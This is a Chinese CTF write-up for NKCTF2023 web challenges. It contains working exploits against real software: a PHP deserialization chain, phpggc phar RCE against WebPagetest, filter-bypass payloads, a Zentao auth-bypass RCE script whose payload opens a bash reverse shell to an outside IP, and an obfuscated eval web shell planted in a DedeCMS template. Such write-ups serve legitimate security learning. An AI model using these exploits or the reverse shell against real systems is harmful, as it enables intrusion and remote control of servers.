@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>NKCTF2023 Web - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="NKCTF2023 Web - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://example.com/2023/03/29/NKCTF%202023%20_%20Web/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-03-29T13:32:20.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>March</span>
+            <span>29,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">NKCTF2023 Web</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p>这比赛咋说呢，两极分化很严重啊。。。。</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="baby-php-SOLVED-SOLVED-natro92"><a href="#baby-php-SOLVED-SOLVED-natro92" class="headerlink" title="baby_php | SOLVED | SOLVED - natro92"></a>baby_php | <strong>SOLVED</strong> | <strong>SOLVED</strong> - natro92</h2><p>dir 读文件，uniq打开即可。（sort、more也行）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Welcome</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;welcome_to_NKCTF&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$arg</span> = <span class="string">&#x27;oww!man!!&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;name == <span class="string">&#x27;welcome_to_NKCTF&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;arg;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>, <span class="variable">$string</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;you are bad&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Happy</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$shell</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$cmd</span>=<span class="string">&#x27;cd ../../..;uniq [b-h]1[!0-9][b-z]&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$shell</span> = <span class="variable language_">$this</span>-&gt;shell;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable language_">$this</span>-&gt;cmd;</span><br><span class="line">    <span class="title function_ invoke__">waf</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hell0</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$func</span>=<span class="string">&#x27;Happy&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;func;</span><br><span class="line">    <span class="variable">$function</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$happy</span> = <span class="keyword">new</span> <span class="title class_">Happy</span>();</span><br><span class="line"><span class="variable">$hello</span> = <span class="keyword">new</span> <span class="title class_">Hell0</span>();</span><br><span class="line"><span class="variable">$welcome</span> = <span class="keyword">new</span> <span class="title class_">Welcome</span>();</span><br><span class="line"><span class="variable">$hello</span>-&gt;func=<span class="variable">$happy</span>;</span><br><span class="line"><span class="variable">$welcome</span>-&gt;arg = <span class="variable">$hello</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$welcome</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="WebPagetest-SOLVED-SOLVED-Boogipop"><a href="#WebPagetest-SOLVED-SOLVED-Boogipop" class="headerlink" title="WebPagetest | SOLVED | SOLVED - Boogipop"></a><strong>WebPagetest | SOLVED | SOLVED - Boogipop</strong></h2><p>解牛魔酬宾这傻逼靶机老子<br>提示是WebPagetest的1day，检索过后发现<a target="_blank" rel="noopener" href="https://avd.aliyun.com/detail?id=AVD-2022-1474319">AVD-2022-1474319</a><br>然后反复使用以下命令RCE：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Monolog/RCE2 system <span class="string">&#x27;id&#x27;</span> -p phar -o testinfo.ini</span><br><span class="line"><span class="comment">#进行url编码</span></span><br><span class="line">URLENC_PAYLOAD=$(cat /tmp/testinfo.ini | xxd -p | tr -d <span class="string">&quot;\n&quot;</span> | sed <span class="string">&quot;s#..#%&amp;#g&quot;</span>)<span class="comment">#写入文件</span></span><br><span class="line">curl -sSkig <span class="string">&#x27;http://43.152.206.162/runtest.php&#x27;</span> -d <span class="string">&#x27;rkey=gadget&#x27;</span> -d <span class="string">&quot;ini=<span class="subst">$URLENC_PAYLOAD</span>&quot;</span> -o -</span><br><span class="line"><span class="comment">#触发反序列化</span></span><br><span class="line">curl -sSkig <span class="string">&#x27;http://43.152.206.162/runtest.php&#x27;</span> -d <span class="string">&#x27;rkey=phar:///var/www/html/results/gadget./testinfo.ini/foo&#x27;</span> -d <span class="string">&quot;ini=<span class="subst">$URLENC_PAYLOAD</span>&quot;</span> -o -</span><br></pre></td></tr></table></figure>
+<p>这里php版本需要在8.2以下，用的是phpgcc工具可以自动生成反序列化gadget，github上开源<br>漏洞产生点在runtest.php中存在任意文件写入，并且也可以触发phar反序列化。</p>
+<h2 id="Easyphp-SOLVED-SOLVED-Boogipop-natro92"><a href="#Easyphp-SOLVED-SOLVED-Boogipop-natro92" class="headerlink" title="Easyphp | SOLVED | SOLVED - Boogipop,natro92"></a><strong>Easyphp | SOLVED | SOLVED - Boogipop,natro92</strong></h2><p>脑瘫Web</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /?a=QNKCDZO&amp;b=<span class="number">240610708</span>&amp;e=<span class="number">114514.1</span>&amp;NS[CTF.go=<span class="number">1</span> HTTP/<span class="number">1.1</span></span><br><span class="line">Host: c68827f5-b783-<span class="number">485</span>a-a206-<span class="number">0550</span>ca863a4d.node1.yuzhian.com.cn</span><br><span class="line">Content-Length: <span class="number">1291</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Origin: http:<span class="comment">//c68827f5-b783-485a-a206-0550ca863a4d.node1.yuzhian.com.cn</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">111.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: http://nkctf.yuzhian.com.cn:8000/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span></span><br><span class="line"><span class="comment">Cookie: _ga=GA1.1.704471072.1678693729; _ga_KCSGQQ51ER=GS1.1.1679669616.8.1.1679675571.0.0.0</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=(~%8F%97%8F%96%91%99%90)(~);</span></span><br></pre></td></tr></table></figure>
+
+<p>最后的cmd可以用：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;cmd=(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">9</span>C%<span class="number">9</span>E%<span class="number">8</span>B%DF%D0%<span class="number">99</span>%<span class="number">93</span>%<span class="number">9</span>E%<span class="number">98</span>);</span><br></pre></td></tr></table></figure>
+<p>前面的随便写，cmd用的是异或绕过，卡在了<code>NS[CTF.go</code>这里。这里用<code>[</code>是因为：</p>
+<blockquote>
+<p>在 PHP 中，变量名称中不能使用句号点（.）。 例如 $a.b 是一个不合法的变量名。因此，PHP 会自动将点替换为下划线。<br>除了点，一些其他字符如果出现在GET参数名中，也将会被自动替换为下划线。会被自动替换的字符列表：</p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;code&gt;<span class="title function_ invoke__">chr</span>(<span class="number">32</span>) ( ) (空格)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chr</span>(<span class="number">46</span>) (.) (点)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chr</span>(<span class="number">91</span>) ([) (中括号)</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chr</span>(<span class="number">128</span>) - <span class="title function_ invoke__">chr</span>(<span class="number">159</span>) (多个字符)&lt;/code&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="Hardphp-SOLVED-SOLVED-Boogipop-sdegree"><a href="#Hardphp-SOLVED-SOLVED-Boogipop-sdegree" class="headerlink" title="Hardphp | SOLVED | SOLVED - Boogipop,sdegree"></a><strong>Hardphp | SOLVED | SOLVED - Boogipop,sdegree</strong></h2><p>脑瘫web</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">01</span>c3bf35-e4f8-<span class="number">4</span>d56-b247-f84fe01ad5da.node1.yuzhian.com.cn</span><br><span class="line">Content-Length: <span class="number">248</span></span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Linux; Android <span class="number">6.0</span>; Nexus <span class="number">5</span> Build/MRA58N) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">111.0</span>.<span class="number">0.0</span> Mobile Safari/<span class="number">537.36</span></span><br><span class="line">Origin: http:<span class="comment">//01c3bf35-e4f8-4d56-b247-f84fe01ad5da.node1.yuzhian.com.cn</span></span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: http://01c3bf35-e4f8-4d56-b247-f84fe01ad5da.node1.yuzhian.com.cn/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span></span><br><span class="line"><span class="comment">Cookie: _ga=GA1.1.704471072.1678693729; _ga_KCSGQQ51ER=GS1.1.1679669616.8.1.1679679956.0.0.0</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">NKCTF=%24_%3D%28%28_%2F_%29._%29%5B_%5D%3B%24_%3D%2B%2B%24_%3B%24__%3D%24_.%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24__.%3D%2B%2B%24_%3B%24__.%3D%2B%2B%24_%3B%24__%3D_.%24__%3B%24%24__%5B%ff%5D%28%24%24__%5B%fe%5D%29%3B&amp;%ff=highlight_file&amp;%fe=/flag</span></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="ezpms-SOLVED-SOLVED-Boogipop"><a href="#ezpms-SOLVED-SOLVED-Boogipop" class="headerlink" title="ezpms| SOLVED | SOLVED - Boogipop"></a><strong>ezpms| SOLVED | SOLVED - Boogipop</strong></h2><p>Zentao 1day越权+任意命令执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># !/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">权限绕过+RCE POC 伪静态传参版</span></span><br><span class="line"><span class="string">禅道系统 影响版本 安全版本</span></span><br><span class="line"><span class="string">开源版 17.4以下的未知版本&lt;=version&lt;=18.0.beta1 18.0.beta2</span></span><br><span class="line"><span class="string">旗舰版 3.4以下的未知版本&lt;=version&lt;=4.0.beta1 4.0.beta2</span></span><br><span class="line"><span class="string">企业版 7.4以下的未知版本&lt;=version&lt;=8.0.beta1 8.0.beta2</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="comment">#&quot;http&quot;: &quot;127.0.0.1:8080&quot;,</span></span><br><span class="line">    <span class="comment">#&quot;https&quot;: &quot;127.0.0.1:8080&quot;,</span></span><br><span class="line">&#125;</span><br><span class="line">def <span class="title function_ invoke__">check</span>(url):</span><br><span class="line">    <span class="comment"># url=&quot;http://10.211.55.3:8008&quot;</span></span><br><span class="line">    url1 = url+<span class="string">&#x27;/misc-captcha-user.html&#x27;</span></span><br><span class="line">    <span class="comment"># url1 = url+&#x27;/index.php?m=misc&amp;f=captcha&amp;sessionVar=user&#x27;#非伪静态版本按照此格式传参</span></span><br><span class="line">    <span class="comment"># url2 = url+&#x27;/index.php?m=block&amp;f=printBlock&amp;id=1&amp;module=my&#x27;#可判断验证绕过的链接</span></span><br><span class="line">    url3 = url + <span class="string">&#x27;repo-create.html&#x27;</span></span><br><span class="line">    url4 = url + <span class="string">&#x27;repo-edit-10000-10000.html&#x27;</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>:<span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    headers2 = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;zentaosid=u6vl6rc62jiqof4g5jtle6pft2; lang=zh-cn; device=desktop; theme=default&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span>,</span><br><span class="line">        <span class="string">&quot;X-Requested-With&quot;</span>:<span class="string">&quot;XMLHttpRequest&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Referer&quot;</span>:url+<span class="string">&quot;/repo-edit-1-0.html&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data1 = <span class="string">&#x27;product%5B%5D=1&amp;SCM=Gitlab&amp;name=66667&amp;path=&amp;encoding=utf-8&amp;client=&amp;account=&amp;password=&amp;encrypt=base64&amp;desc=&amp;uid=&#x27;</span></span><br><span class="line">    data2 = <span class="string">&#x27;SCM=Subversion&amp;client=`bash -c &quot;bash -i &gt;%26 /dev/tcp/114.116.119.253/7788 &lt;%261&quot;`&#x27;</span></span><br><span class="line">    s=requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        req1 = s.<span class="title function_ invoke__">get</span>(url1,proxies=proxies,timeout=<span class="number">5</span>,verify=False,headers=headers)</span><br><span class="line">        req3 = s.<span class="title function_ invoke__">post</span>(url3,data=data1,proxies=proxies,timeout=<span class="number">5</span>,verify=False,headers=headers2)</span><br><span class="line">        req4 = s.<span class="title function_ invoke__">post</span>(url4,data=data2,proxies=proxies,timeout=<span class="number">5</span>,verify=False,headers=headers2)</span><br><span class="line">        <span class="keyword">print</span>(req4.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;uid=&#x27;</span> in req4.text:</span><br><span class="line">            <span class="keyword">print</span>(url,<span class="string">&quot;&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> True</span><br><span class="line">    except <span class="built_in">Exception</span> <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> False</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">print</span>(<span class="title function_ invoke__">check</span>(<span class="string">&quot;http://ee12ada9-6792-4df7-b671-06316b719ff3.node1.yuzhian.com.cn/&quot;</span>))</span><br></pre></td></tr></table></figure>
+<h2 id="ezcms-SOLVED-Working-Boogipop"><a href="#ezcms-SOLVED-Working-Boogipop" class="headerlink" title="ezcms| SOLVED | Working - Boogipop"></a><strong>ezcms| SOLVED | Working - Boogipop</strong></h2><p>考点：织梦cms 1day后台getshell<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/seizer/p/17146267.html">织梦DedeCMS 0day RCE - seizer-zyx - 博客园</a><br>首先发现管理员后台:&#x2F;dede&#x2F;login.php admin&#x2F;admin<br>进入管理员后台面板后按照上述文章复现<br>最重要的一点是，也就是shell文件的保存位置，以及文件包含漏洞触发点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1679735944068-c4b2f2f6-338f-4482-aad0-b2e5008a76dc.png#averageHue=%23efeeee&clientId=uc0bd696d-139f-4&from=paste&id=ua88df869&originHeight=657&originWidth=2583&originalType=url&ratio=1&rotation=0&showTitle=false&status=done&style=none&taskId=u05518d08-19e9-4b98-8f2e-088c14974a5&title="><br>首先是在模板管理的默认模板界面添加一个test模板，内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php &quot;\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73&quot;(&#x27;./shell.php&#x27;, &quot;&lt;?php eva&quot; . &quot;l(\$_GE&quot; . &quot;T[a]);&quot;);</span><br></pre></td></tr></table></figure>
